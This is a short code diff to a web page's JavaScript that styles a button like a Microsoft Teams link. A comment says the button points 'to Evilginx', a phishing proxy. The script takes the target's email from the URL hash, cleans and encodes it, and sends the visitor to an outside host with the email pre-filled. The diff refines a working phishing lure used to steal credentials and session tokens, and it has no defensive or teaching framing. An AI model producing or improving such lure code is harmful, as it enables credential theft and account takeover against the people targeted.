@@ -96,7 +96,7 @@ window.addEventListener('load', function() {
 
   // --- Grab email from hash ---
   let email = window.location.hash ? window.location.hash.substring(1) : '';
-  email = email.replace(/=*$/, ''); // strip trailing =
+  email = decodeURIComponent(email).replace(/=+$/, ''); // CLEAN EMAIL
 
   // --- Update button to point to Evilginx ---
   const button = document.querySelector('.teams-button');
@@ -104,7 +104,7 @@ window.addEventListener('load', function() {
     const baseURL = 'https://access-meetings.visions-solutions.ca/OFcNokky';
     button.onclick = function() {
       window.location.href = email && email.includes('@')
-        ? baseURL + '#' + email
+        ? baseURL + '#' + encodeURIComponent(email)
         : baseURL;
     };
   }
@@ -112,7 +112,3 @@ window.addEventListener('load', function() {
 </script>
 </body>
 </html>
-
-
-
-
